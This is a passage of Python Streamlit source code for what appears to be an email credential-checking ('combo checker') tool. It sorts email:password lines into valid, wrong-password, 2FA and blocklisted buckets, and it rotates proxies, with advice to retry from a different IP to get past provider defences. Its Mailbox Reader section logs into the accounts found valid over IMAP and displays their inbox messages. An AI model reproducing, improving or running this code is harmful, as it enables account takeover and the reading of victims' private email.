        proxy_len_val = len(str_lit.session_state.proxy_results)
        retry_len_val = len(str_lit.session_state.retry_results)
        rbl_len_val = len(str_lit.session_state.rbl_results)
        smtp_len_val = len(str_lit.session_state.get("pre_smtp_failed", []))
        dns_len_val = len(str_lit.session_state.get("pre_dns_failed", []))
        skip_len_val = len(str_lit.session_state.skip_results)
        unknown_len_val = len(str_lit.session_state.unknown_results)
        valid_res_copy = list(str_lit.session_state.valid_results)
        log_lines_copy = list(str_lit.session_state.log_lines)
        _report_total = len(str_lit.session_state.report_entries)
        report_entries_copy = list(str_lit.session_state.report_entries)[-_DF_TAIL:]
        zip_bytes_copy = str_lit.session_state.zip_bytes
        zip_name_copy = str_lit.session_state.zip_name
        start_ts_copy = str_lit.session_state.start_timestamp
        end_ts_copy = str_lit.session_state.end_timestamp
        duration_copy = str_lit.session_state.total_duration
        summary_buckets = {
            "✅ Valid Accounts Found": list(str_lit.session_state.valid_results),
            "❌ Wrong Password Found": list(str_lit.session_state.wrong_results),
            "🚪 Login Dropped (* BYE) - server answered, password untested":
                list(str_lit.session_state.login_drop_results),
            "🔌 Connection Failed Found": list(str_lit.session_state.conn_results),
            "🩹 Proxy Unhealthy Found": list(str_lit.session_state.proxy_results),
            "🔐 App Password / 2FA Found": list(str_lit.session_state.need_app_results),
            "🕓 RETRY_LATER Found": list(str_lit.session_state.retry_results),
            "🚫 RBL Blocked Found": list(str_lit.session_state.rbl_results),
            "🛰 DNS Failed (pre-check)": list(str_lit.session_state.get("pre_dns_failed", [])),
            "📮 SMTP Failed (pre-check)": list(str_lit.session_state.get("pre_smtp_failed", [])),
            "⏭ Skipped / Filtered": list(str_lit.session_state.skip_results),
            "❓ Unclassified": list(str_lit.session_state.unknown_results),
        }

    str_lit.markdown(f"### {status_label}")
    str_lit.caption(f"Protocols dialled this run: **{' + '.join(active_protocols())}**"
                    + ("  ·  SMTP/ManageSieve were CONFIRM-ONLY"
                       if any(p in ("SMTP", "ManageSieve") for p in active_protocols()) else ""))

    if str_lit.session_state.run_completion_status == "Unfinished":
        # FIX RS-4: the reason came from list_unfinished_runs(), so the TypeError
        # in block 083 degraded this to a bare warning with no cause and no
        # progress. It reads the watchdog record and remaining() directly now.
        _rec = runstate.load() or {}
        _left = runstate.remaining()
        if _rec or _left:
            str_lit.warning(
                f"⚠ **Engine Stopped Unfinished:** Reason: "
                f"*{_rec.get('reason') or _rec.get('cause') or 'Unknown'}* | "
                f"Progress at stop: {_rec.get('checked', 0)}/{_rec.get('total', 0)} | "
                f"**{len(_left)} account(s) still to check** - set Engine Action Mode "
                f"to 'Resume Unfinished' and press Start to continue.")
        else:
            str_lit.warning("⚠ **Engine Stopped Unfinished.**")

    if start_ts_copy and end_ts_copy:
        str_lit.info(f"⏱ **Session Timestamps:** Started **{start_ts_copy}** | "
                     f"Ended **{end_ts_copy}** | Duration **{duration_copy}**")

    _s_pairs = [
        ("✅ Clean Valid", clean_count_val),
        ("❌ Wrong Password", wrong_len_val),
        ("🔑 App Password / 2FA", need_len_val),
        ("🚪 Login Dropped", login_drop_len_val),
        ("🔌 Connection Failed", conn_len_val),
        ("🩹 Proxy Unhealthy", proxy_len_val),
        ("🚫 RBL Blocked", rbl_len_val),
        ("🕓 RETRY_LATER", retry_len_val),
        ("🛰 DNS Failed", dns_len_val),
        ("📮 SMTP Failed", smtp_len_val),
        ("⏭ Skipped", skip_len_val),
        ("❓ Unclassified", unknown_len_val),
        # v13.67: smtp/dns were missing from this sum while both rows are printed
        # above it, so the total never matched the table.
        ("📚 Accounts In Buckets",
         clean_count_val + wrong_len_val + need_len_val + login_drop_len_val
         + conn_len_val + proxy_len_val + rbl_len_val + retry_len_val + skip_len_val
         + unknown_len_val + smtp_len_val + dns_len_val),
    ]
    for _sc, (_sl, _sv) in zip(metric_grid(_s_pairs, per_row=3), _s_pairs):
        _sc.metric(_sl, _sv)

    if login_drop_len_val:
        str_lit.warning(
            f"🚪 **{login_drop_len_val} account(s) hit a LOGIN DROP** - the mail server "
            f"ANSWERED, accepted the LOGIN command and then closed the socket (* BYE). "
            f"These passwords are still UNTESTED: it is usually a rejected password or an "
            f"app-password requirement, so retry them from a different IP (or with an app "
            f"password) before discarding them.")
    if proxy_len_val:
        str_lit.warning(
            f"🩹 **{proxy_len_val} account(s) never reached a mailbox** - every attempt died "
            f"with 407 Proxy Authentication Required. Those passwords are still UNTESTED.")
    if skip_len_val:
        str_lit.info(
            f"⏭ **{skip_len_val} account(s) were skipped** (bad format / disposable / "
            f"fast-mode cooldown). They were counted as checked; they are listed in the "
            f"Skipped bucket and the ZIP.")
    if wrong_len_val and CFG.get("CONFIRM_WRONG_ACROSS_HOSTS", True):
        str_lit.caption(
            "❌ Wrong Password was CONFIRMED across at least two hosts or two rungs (or with "
            "no candidate left to dial) before being accepted. Turn the sidebar guard OFF "
            "only if you need raw speed.")

    # FIX SPEED-12 / v13.51: one st.code per bucket instead of one per LINE. Up to
    # 480 code widgets became 12, and the per-line widgets are behind a toggle.
    _seed_widget("bb_sum_full", dflt=False)
    _show_full = str_lit.toggle(
        "Show full bucket contents inline (slower on a phone)",
        key="bb_sum_full",
        help="Off: 12 boxes with a count. On: every line, still capped at "
             "BUCKET_RENDER_TAIL. The download button above always carries all of it.")
    for title, items in summary_buckets.items():
        with str_lit.expander(f"{title} ({len(items)})", expanded=False):
            if not items:
                str_lit.caption("nothing here yet")
                continue
            _safe = "".join(ch if ch.isalnum() else "_" for ch in title).strip("_")
            str_lit.download_button(
                f"Download these {len(items)} line(s)",
                data="\n".join(str(i) for i in items).encode("utf-8"),
                file_name=f"{_safe}_{len(items)}.txt",
                mime="text/plain", key=f"sumdl_{_safe}")
            if _show_full:
                str_lit.code("\n".join(str(i) for i in items[:BUCKET_RENDER_TAIL]),
                             language="text")
                if len(items) > BUCKET_RENDER_TAIL:
                    str_lit.caption(f"... and {len(items) - BUCKET_RENDER_TAIL} more - use the "
                                    f"download button above for the full list.")
            else:
                str_lit.caption(f"{len(items)} line(s) - download above, or turn on "
                                f"'Show full bucket contents inline'.")

    exec_tab1_p, exec_tab2_p = str_lit.tabs(["⚡ Live Execution Stream",
                                             "📊 Live Report Log & Analytics"])
    with exec_tab1_p:
        if log_lines_copy:
            render_logs(log_lines_copy)
        else:
            str_lit.info("No logs available from previous run.")
    with exec_tab2_p:
        # v13.52: the copy is capped above, so the dataframe call is unchanged and
        # a 2000-row trace payload can no longer be handed over in one go.
        if report_entries_copy:
            if _report_total > _DF_TAIL:
                str_lit.caption(
                    f"Showing the newest **{_DF_TAIL}** of **{_report_total}** traced "
                    f"account(s) - the ZIP and the Full Log page carry every row.")
            str_lit.dataframe(pd.DataFrame(report_entries_copy[::-1]),
                              width="stretch", height=320)
        else:
            str_lit.info("No report logs available.")

    if zip_bytes_copy and zip_name_copy:
        str_lit.download_button("📦 Download All Results (.zip Package)", data=zip_bytes_copy,
                                file_name=zip_name_copy, mime="application/zip")

    try:
        status_text.text("Progress: complete - summary ready.")
    except Exception:
        pass
# @@END 108 RESULTS_SUMMARY

# @@BLOCK 109 IN_APP_READER deps=019,034,037,039,053,062,069,093,098
section_title("📬", "Mailbox Reader (Interactive Inbox Inspection)",
              "read verified inboxes without leaving the app")

# v13.54: body renderer. Optional - a failed import keeps the escaped text view.
try:
    import mailview
except Exception:
    mailview = None

# ==========================================================================
# v13.66 - THE READER NOW SURVIVES A REFRESH
#
# The chosen account, the message count and the remote-image switch lived in
# session_state ONLY, so a refresh (or a backgrounded phone tab being reaped)
# dropped all three and the picker snapped back to the first valid account.
# They are a per-user file now, exactly like the paste box, the settings and the
# theme - and the picker is re-mapped by MAILBOX, so a run that rewrote the
# password on that line still lands on the same inbox instead of resetting.
#
# The inbox re-opens itself ONCE after a restore (never on a plain rerun and
# never on an account switch), so a refresh costs one fetch and not a connection
# per rerun.
#
# v13.67: that re-open is a SWITCH now, persisted with the rest. Off means the
# account is still remembered and the picker still restores, but the inbox waits
# for the button - for anyone whose provider counts an IMAP connect against the
# mailbox, or who does not want a login every time the page is reloaded.
#
# The stored account is validated against the CURRENT option list BEFORE the
# selectbox is created. With key= and no index, a stored value that is not in
# options is a StreamlitAPIException - which is what a stale account did.
# ==========================================================================
_READER_STATE_NAME = "reader_state.json"
_READER_OWNER_KEY = "_reader_owner"
_READER_DEFAULTS = {"acct": "", "max": 10, "remote": False, "auto": True}


def _reader_path() -> str:
    try:
        return user_file(_READER_STATE_NAME)
    except Exception:
        return _READER_STATE_NAME


def _reader_load() -> dict:
    """This user's remembered reader state. Never raises."""
    out = dict(_READER_DEFAULTS)
    p = _reader_path()
    if not os.path.exists(p):
        return out
    try:
        with open(p, encoding="utf-8") as f:
            data = json.load(f)
    except Exception as e:
        warnings.warn(f"reader state unreadable ({e}); starting from defaults")
        return out
    if isinstance(data, dict):
        for k in out:
            if k in data:
                out[k] = data[k]
    return out


def _reader_save(vals) -> dict:
    """Merge `vals` into this user's reader state and rewrite it atomically.

    Self-contained on purpose: an on_change callback runs BEFORE the script
    body, so it has no module globals from the previous run to lean on.
    """
    p = _reader_path()
    cur = _reader_load()
    cur.update(vals or {})
    tmp = p + ".tmp"
    try:
        with file_write_lock:
            with open(tmp, "w", encoding="utf-8") as f:
                json.dump(cur, f, indent=1)
            os.replace(tmp, p)
    except Exception as e:
        warnings.warn(f"could not save reader state: {e}")
    return cur


def _on_reader_change():
    """Persist the picker, the count, the image switch and the re-open switch."""
    try:
        _reader_save({"acct": str(str_lit.session_state.get("bb_reader_acct") or ""),
                      "max": int(str_lit.session_state.get("bb_reader_max") or 10),
                      "remote": bool(str_lit.session_state.get("bb_reader_remote")),
                      "auto": bool(str_lit.session_state.get("bb_reader_auto", True))})
    except Exception:
        pass


# ---- owner gate: a second unlock in this tab must not inherit the last one ----
_reader_owner = _cache_owner()
if str_lit.session_state.get(_READER_OWNER_KEY) != _reader_owner:
    for _k in ("bb_reader_acct", "bb_reader_max", "bb_reader_remote", "bb_reader_auto",
               "bb_reader_msgs", "bb_reader_for", "bb_reader_note",
               "_reader_tried", "_rdr_state"):
        str_lit.session_state.pop(_k, None)
    str_lit.session_state[_READER_OWNER_KEY] = _reader_owner
if "_rdr_state" not in str_lit.session_state:
    str_lit.session_state["_rdr_state"] = _reader_load()
_rdr_state = str_lit.session_state["_rdr_state"]
if "bb_reader_remote" not in str_lit.session_state:
    str_lit.session_state["bb_reader_remote"] = bool(_rdr_state.get("remote"))
if "bb_reader_auto" not in str_lit.session_state:
    str_lit.session_state["bb_reader_auto"] = bool(_rdr_state.get("auto", True))
if "bb_reader_max" not in str_lit.session_state:
    try:
        str_lit.session_state["bb_reader_max"] = max(
            1, min(50, int(_rdr_state.get("max") or 10)))
    except Exception:
        str_lit.session_state["bb_reader_max"] = 10

with session_state_lock:
    current_valid_set = list(str_lit.session_state.valid_results) or load_persistent_valid_results()

if not current_valid_set:
    str_lit.info("Run the checker successfully or ensure valid account files exist to "
                 "populate valid accounts.")
else:
    valid_combo_options = []
    for item in current_valid_set:
        try:
            if ":" in item:
                email_val, remainder = item.split(":", 1)
                valid_combo_options.append(f"{email_val.strip()}:{remainder.split('|')[0].strip()}")
        except Exception:
            continue

    if valid_combo_options:
        # ---- resolve the picker value BEFORE the widget exists -----------------
        # The session value wins while it is still offered; the remembered one is
        # next; then the same mailbox under a re-quoted line; then option 1.
        _cur_acct = str_lit.session_state.get("bb_reader_acct") or ""
        _mem_acct = str(_rdr_state.get("acct") or "")
        # A refresh is exactly this: nothing in the session, something remembered.
        _restored = (not _cur_acct) and bool(_mem_acct)
        if _cur_acct in valid_combo_options:
            _pick = _cur_acct
        elif _mem_acct in valid_combo_options:
            _pick = _mem_acct
        else:
            _pick = ""
            _mem_email = _mem_acct.split(":", 1)[0].strip().lower()
            if _mem_email:
                for _opt in valid_combo_options:
                    if _opt.split(":", 1)[0].strip().lower() == _mem_email:
                        _pick = _opt
                        break
            if not _pick:
                _pick = valid_combo_options[0]
        str_lit.session_state["bb_reader_acct"] = _pick
        if _mem_acct != _pick:
            try:
                _reader_save({"acct": _pick})
            except Exception:
                pass
            _rdr_state["acct"] = _pick

        selected_combo = str_lit.selectbox("Select Valid Account to Read:",
                                           options=valid_combo_options, key="bb_reader_acct",
                                           on_change=_on_reader_change)
        # FIX W-3 (v13.67): positional default removed - _seed_widget() has
        # already written the key, and passing both warned on every load.
        _seed_widget("bb_reader_max", lo=1, hi=50, dflt=10)
        max_msgs = str_lit.slider("Number of Recent Messages to Fetch", 1, 50,
                                  key="bb_reader_max", on_change=_on_reader_change)

        allow_remote = str_lit.checkbox(
            "Load remote images in HTML view (tracking pixels fire)", key="bb_reader_remote",
            on_change=_on_reader_change,
            help="Inline cid: images are always shown - they are embedded in the message. "
                 "This switch is only about images hosted on the sender's server.")

        # v13.67: the re-open switch. Off does NOT forget the account - the picker
        # still restores, the inbox just waits for the button. It is saved with
        # everything else, so it survives the reload it is about.
        allow_auto = str_lit.checkbox(
            "Re-open this inbox automatically after a reload", key="bb_reader_auto",
            on_change=_on_reader_change,
            help="On: reloading the page restores the account AND re-fetches its inbox "
                 "once. Off: the account is still remembered, but nothing connects "
                 "until you press Read Inbox Messages. Off saves one IMAP login per "
                 "reload and keeps provider connect counters quiet.")

        # v13.56: which mailview is actually deployed. Silent on v13.55+.
        _mv_ver = getattr(mailview, "__version__", "unknown") if mailview else "missing"
        if mailview is not None and _mv_ver != "v13.55":
            str_lit.caption(f"body renderer: mailview.py {_mv_ver} - update it to v13.55 "
                            f"to get the memory cap and attachment previews.")

        _r_msgs = str_lit.session_state.get("bb_reader_msgs") or []
        _r_for = str_lit.session_state.get("bb_reader_for") or ""
        _r_note = str_lit.session_state.get("bb_reader_note") or ""

        def _reader_do_fetch(combo, limit):
            """Fetch one inbox into session state. Never raises."""
            str_lit.session_state["_reader_tried"] = True
            try:
                acc_email, acc_pass = combo.split(":", 1)
            except Exception:
                str_lit.session_state["bb_reader_note"] = "the selected line has no password"
                return
            acc_email, acc_pass = acc_email.strip(), acc_pass.strip()
            imap_hosts = get_servers(acc_email).get("imap", [])
            mailbox_proxy = (sample_alive_proxy(domain=acc_email.split("@")[-1])
                             if use_proxy else None)

            # v13.55: a new fetch replaces the old list outright, so two
            # accounts cannot bleed into each other.
            str_lit.session_state["bb_reader_msgs"] = []
            str_lit.session_state["bb_reader_for"] = acc_email
            str_lit.session_state["bb_reader_note"] = ""

            if not imap_hosts:
                str_lit.session_state["bb_reader_note"] = (
                    "No IMAP host available for this provider domain name.")
                return
            try:
                with str_lit.spinner(f"Connecting via [{px_tag(mailbox_proxy)}] and "
                                     f"fetching inbox for {acc_email}..."):
                    # v13.48: read_mailbox_messages() already resolves the whole
                    # host ladder itself via get_servers() and falls back to the
                    # host passed in. The old `for srv in imap_hosts:` loop re-ran
                    # that entire ladder once per host, so a 4-host domain could
                    # open 4x4 ladders and burn proxy credit before giving up.
                    ok_read, msgs, note = read_mailbox_messages(
                        acc_email, acc_pass, imap_hosts[0],
                        proxy_str=mailbox_proxy, limit=limit)
                    fetched_msgs, success_read = msgs, True
                    if not ok_read:
                        fetched_msgs, success_read = [], False
                if ok_read and fetched_msgs:
                    # v13.55: THE LIST LIVES IN SESSION STATE. It used to be a
                    # local inside this button branch, so tapping the View
                    # radio (or any Move-to dropdown) reran the script, the
                    # button was False, the branch was skipped and the whole
                    # message list disappeared - the reader "reset" itself.
                    str_lit.session_state["bb_reader_msgs"] = fetched_msgs
                else:
                    str_lit.session_state["bb_reader_note"] = note or "unknown reason"
            except Exception as _rf_err:
                str_lit.session_state["bb_reader_msgs"] = []
                str_lit.session_state["bb_reader_note"] = f"{type(_rf_err).__name__}: {_rf_err}"

        if str_lit.button("📖 Read Inbox Messages"):
            if selected_combo:
                _reader_do_fetch(selected_combo, max_msgs)
        elif _restored and _pick and not _r_msgs and not _r_note:
            # ONE attempt, only on a restore, and only when the switch is on. A
            # refresh re-opens the inbox the user was in instead of showing an
            # empty page - unless they turned that off.
            if allow_auto:
                str_lit.caption("↩ Restored your last account - re-opening its inbox...")
                _reader_do_fetch(_pick, max_msgs)
            else:
                str_lit.caption("↩ Restored your last account - auto re-open is off, so "
                                "nothing was fetched. Press Read Inbox Messages when you "
                                "want this inbox.")

        # ---- render from state, OUTSIDE the button branch ----
        _r_msgs = str_lit.session_state.get("bb_reader_msgs") or []
        _r_for = str_lit.session_state.get("bb_reader_for") or ""
        _r_note = str_lit.session_state.get("bb_reader_note") or ""

        if _r_note:
            str_lit.warning(f"Could not read mailbox: {_r_note}")
        elif _r_msgs:
            str_lit.success(
                f"Retrieved {len(_r_msgs)} recent message(s) from {_r_for}. "
                f"Tap a message to open its body.")
            # FIX BODY-KEY (v13.57): the body key was "bbbody_%d" - POSITIONAL. Open
            # account A, switch to account B, read: message 1 of B reused key
            # "bbbody_1", the seed below found the key already present and skipped,
            # and the box showed account A's message 1 body. The key carries the
            # account and the message id now, so it cannot collide across accounts
            # or across a re-fetch of the same account.
            _acct_slug = re.sub(r"[^a-z0-9]+", "_", (_r_for or "").lower()).strip("_")[:48]
            if not _acct_slug:
                _acct_slug = "acct"
            _keep_prefix = "bbbody_%s_" % _acct_slug
            # Drop the bodies of any OTHER account, so the keyspace cannot grow for
            # ever and a widget key from a previous account is never left dangling.
            for _stale in [k for k in list(str_lit.session_state.keys())
                           if str(k).startswith("bbbody_")
                           and not str(k).startswith(_keep_prefix)]:
                try:
                    del str_lit.session_state[_stale]
                except Exception:
                    pass
            # v13.53: one expander per message - the CLICK that was missing. Only
            # headers could ever appear, because the fetch never asked the server
            # for the body. Pre-open the first so it is obvious on a phone.
            # v13.54: mailview renders the real message - text or HTML, cid: inline
            # images embedded.
            # v13.56: SIGNATURE-PROOF. Three positional args plus allow_remote= is
            # valid on BOTH the v13.54 render(st, raw, key, allow_remote) and the
            # v13.55 render(st, raw, key, fallback, allow_remote), and the body is
            # seeded here so the text box fills either way. A TypeError from any
            # future mismatch degrades to a plain text area instead of a red page.
            for idx, m in enumerate(_r_msgs, 1):
                _subj = (m.get("subject") or "(no subject)").strip()
                _from = (m.get("from") or "(unknown sender)").strip()
                _label = "%d. %s - %s" % (idx, _subj[:70], _from[:40])
                with str_lit.expander(_label, expanded=(idx == 1)):
                    str_lit.caption(f"From: {_from}  ·  Date: {m.get('date')}")
                    _mid = re.sub(r"[^A-Za-z0-9]+", "_", str(m.get("id") or idx)).strip("_")[:24]
                    _mv_key = "%s%s" % (_keep_prefix, _mid or idx)
                    _mv_body = m.get("body") or "(no readable body)"
                    if _mv_key not in str_lit.session_state:
                        str_lit.session_state[_mv_key] = _mv_body
                    if mailview is not None and hasattr(mailview, "render"):
                        try:
                            mailview.render(str_lit, m.get("raw") or b"", _mv_key,
                                            allow_remote=allow_remote)
                        except TypeError as _mv_err:
                            str_lit.caption(f"renderer mismatch ({_mv_err}) - plain text shown")
                            str_lit.text_area("Message Body", height=180, key=_mv_key)
                    else:
                        str_lit.markdown(
                            "<div style='white-space:pre-wrap;"
                            "font-family:ui-monospace,monospace;font-size:12px'>"
                            + html.escape(_mv_body)
                            + "</div>",
                            unsafe_allow_html=True)
# @@END 109 IN_APP_READER

# @@BLOCK 110 FOOTER deps=008,034
section_title("🧭", "Navigation", f"{BUILD_TAG} - block edition")

_n1, _n2, _n3, _n4 = str_lit.columns(4)
with _n1:
    try:
        str_lit.page_link("pages/3_Mailbox_Reader.py", label="📥 Mailbox Reader",
                          width="stretch")
    except Exception:
        str_lit.caption("Reader lives at pages/3_Mailbox_Reader.py")
with _n2:
    try:
        str_lit.page_link("pages/2_Diagnostics.py", label="🔍 Diagnostics",
                          width="stretch")
    except Exception:
        str_lit.caption("Diagnostics lives at pages/2_Diagnostics.py")
with _n3:
    try:
        str_lit.page_link("pages/4_Downloads.py", label="📦 Export Studio",
                          width="stretch")
    except Exception:
        str_lit.caption("Export Studio lives at pages/4_Downloads.py")
with _n4:
    try:
        str_lit.page_link("pages/6_User_Guide.py", label="📖 User Guide",
                          width="stretch")
    except Exception:
        str_lit.caption("User Guide lives at pages/6_User_Guide.py")

str_lit.caption(
    f"Build {BUILD_TAG} · CFG {CFG_VERSION} · block edition. "
    f"Every section is a replaceable @@BLOCK - run verify_blocks.py after every paste."
)
# @@END 110 FOOTER
# @@EOF
